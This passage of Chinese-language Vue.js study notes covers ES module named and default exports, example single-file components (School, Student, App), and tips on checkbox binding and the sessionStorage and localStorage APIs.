// 导出并重命名
export { name as myName, age as myAge } from './myModule';
```
其他模块可以通过重命名后的名称引入导出的内容：
```javascript
import { myName, myAge } from './myModule';
```

其中，命名导出（Named Exports）和默认导出（Default Export）是两种常用的导出方式，它们之间有一些区别：

命名导出（Named Exports）：
- 可以导出多个变量、函数、类等内容，每个导出都需要使用`export`关键字单独导出。
- 在其他模块中，需要使用解构赋值或者直接引用导出的名称来引入具体的导出内容。
- 适用于需要导出多个内容的情况，可以更灵活地组织和管理模块中的内容。

默认导出（Default Export）：
- 一个模块只能有一个默认导出，使用`export default`关键字导出。
- 在其他模块中，可以直接通过`import`语句引入默认导出的内容，不需要使用大括号或者指定名称。
- 适用于导出一个主要的内容或者模块，简化了引入默认导出内容的语法。

##### 区别总结：
- 命名导出适用于需要导出多个内容的情况，可以灵活地导出多个变量、函数、类等。
- 默认导出适用于导出一个主要的内容或模块，简化了引入默认导出内容的语法。
- 在使用时，命名导出需要使用解构赋值或者指定名称来引入内容，而默认导出可以直接引入默认导出的内容。

##### 示例

方式一：按名称导出

```js
export const school = Vue.extend({
		name:'School',
		data(){
			return {
				name:'尚硅谷',
				address:'北京昌平'
			}
		},
		methods: {
			showName(){
				alert(this.name)
			}
		},
	})
```

导入：

```js
import { school } from 'some-path/vueFileName';
console.log(school); // 
```

方式二：统一导出

```js
 const school = Vue.extend({
		name:'School',
		data(){
			return {
				name:'尚硅谷',
				address:'北京昌平'
			}
		},
		methods: {
			showName(){
				alert(this.name)
			}
		},
	})
    export {school}
```

导入：

```js
import { school } from 'some-path/vueFileName';
console.log(school); // 
```

方式三：默认导出

```js
 const school = Vue.extend({
		name:'School',
		data(){
			return {
				name:'尚硅谷',
				address:'北京昌平'
			}
		},
		methods: {
			showName(){
				alert(this.name)
			}
		},
	})
export default school
```

导入：

```js
import  用默认导出，你不需要提供名称，因为你可以自己想怎么定义都行  from 'some-path/vueFileName';
console.log(用默认导出，你不需要提供名称，因为你可以自己想怎么定义都行); // 
```

由于以上 `Vue.extend` 可以省略，最终可得

#### School.vue

```vue
<template>
	<div class="demo">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<button @click="showName">点我提示学校名</button>	
	</div>
</template>

<script>
	 export default {
		name:'School',
		data(){
			return {
				name:'尚硅谷',
				address:'北京昌平'
			}
		},
		methods: {
			showName(){
				alert(this.name)
			}
		},
	}
</script>

<style>
	.demo{
		background-color: orange;
	}
</style>
```

#### Student.vue

```vue
<template>
	<div>
		<h2>学生姓名：{{name}}</h2>
		<h2>学生年龄：{{age}}</h2>
	</div>
</template>

<script>
	 export default {
		name:'Student',
		data(){
			return {
				name:'张三',
				age:18
			}
		}
	}
</script>
```

#### App 组件

在 Vue.js 中，一个应用程序通常由多个组件组成，而 App.vue 就是这些组件中的最顶层的根组件。它管理了所有的组件，所以需要在其中引入并注册所有组件。

1. **定义根组件**：`App.vue` 文件定义了应用程序的根组件，即应用程序的最顶层组件，其他组件通常嵌套在根组件内部。
2. **组织应用程序结构**：`App.vue` 文件可以包含应用程序的整体结构，包括页面布局、导航栏、侧边栏等，起到组织和管理应用程序结构的作用。
3. **引入其他组件**：`App.vue` 文件可以引入其他 Vue 组件，通过在模板中引用这些组件来构建应用程序的界面和功能。
4. **定义路由视图**：在使用 Vue Router 进行路由管理时，`App.vue` 文件通常会包含 `<router-view>` 标签，用来显示当前路由对应的组件内容。
5. **全局样式和逻辑**：可以在 `App.vue` 文件中定义全局的样式和逻辑，以确保这些样式和逻辑能够应用到整个应用程序中。
6. **提供应用程序配置**：`App.vue` 文件也可以包含应用程序的配置信息，比如应用程序的名称、图标、主题等，以及全局的配置选项。

`App.vue` 文件在 Vue.js 应用程序中扮演着非常重要的角色，它是整个应用程序的入口和根组件，负责组织和管理应用程序的结构、样式和逻辑，同时也起到连接其他组件的作用，是应用程序的核心所在。

App.vue

```vue
<template>
	<div>
		<School></School>
		<Student></Student>
	</div>
</template>

<script>
	//引入组件
	import School from './School.vue'
	import Student from './Student.vue'

	export default {
		name:'App',
		components:{
			School,
			Student
		}
	}
</script>
```

#### main.js

```js
import App from './App.vue'

new Vue({
	el:'#root',
	template:`<App></App>`,
	components:{App},
})
```

#### index.html

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>练习一下单文件组件的语法</title>
	</head>
	<body>
		<!-- 准备一个容器 -->
		<div id="root"></div>
		<script type="text/javascript" src="../js/vue.js"></script>
		<script type="text/javascript" src="./main.js"></script>
	</body>
</html>
```

以上代码实际上在浏览器中并不能运行，因为浏览器并不支持 ES6 和 vue 的语法，需要在脚手架中启动















# 小技巧

## 浏览器强制刷新

shift+刷新

## checkBox 动态勾选

在 html 中 

```
<input type="checkbox" checked  />
```

即为默认勾选

```
<input type="checkbox"   />
```

即为默认不勾选

在 vue 中可以通过绑定一个动态的 boolean 值来动态决定一个属性是否添加
```
<input type="checkbox" :checked="true" /> // 添加
<input type="checkbox" :checked="false" /> // 不添加
```

绑定到变量上，和检测状态变化函数

```
<input type="checkbox" :checked="todo.done" @change="handleCheck(todo.id)" />
```

方式二：

由于 todo.done 是 boolean 值，所以也可以写作下面方式

```
<input type="checkbox" v-model="todo.done"  />
```

## 浏览器本地存储

1. 存储内容大小一般支持5MB左右（不同浏览器可能还不一样）

2. 浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。

3. 相关API：

    1. ```xxxxxStorage.setItem('key', 'value');```
        				该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。

    2. ```xxxxxStorage.getItem('person');```

        ​		该方法接受一个键名作为参数，返回键名对应的值。

    3. ```xxxxxStorage.removeItem('key');```

        ​		该方法接受一个键名作为参数，并把该键名从存储中删除。

    4. ``` xxxxxStorage.clear()```

        ​		该方法会清空存储中的所有数据。

- `Window.sessionStorage`：会话存储，数据在当前会话期间可用，当会话结束时数据会被清除。
- `Window.localStorage`：本地存储，数据会永久保存在浏览器中，除非显式删除或浏览器清除缓存。

您可以使用这两个属性来存储和获取数据，例如：
```javascript
// 使用 sessionStorage 存储数据
sessionStorage.setItem('key', 'value');
const value = sessionStorage.getItem('key');
// 使用 localStorage 存储数据
localStorage.setItem('key', 'value');
const value = localStorage.getItem('key');
```

4. 备注：

    1. SessionStorage存储的内容会随着浏览器窗口关闭而消失。
    2. LocalStorage存储的内容，需要手动清除才会消失。
    3. ```xxxxxStorage.getItem(xxx)```如果xxx对应的value获取不到，那么getItem的返回值是null。
    4. ```JSON.parse(null)```的结果依然是null。

5. 相关应用

		1. **搜索关键字缓存**：利用浏览器本地存储记录用户搜索过的关键字
		1. **阅读进度保存**：对于阅读类网站或应用，您可以使用本地存储来保存用户的阅读进度，以便用户在下次访问时继续阅读。
		1. **表单数据缓存**：当用户在填写表单时，您可以使用本地存储来缓存表单数据，以防用户意外关闭页面或刷新页面时丢失已填写的内容。
		1. **用户偏好设置**：您可以使用本地存储来保存用户的偏好设置，例如主题颜色、语言选择、字体大小等，以便在用户下次访问时自动应用这些设置。

## 常用动画库

Animate.css

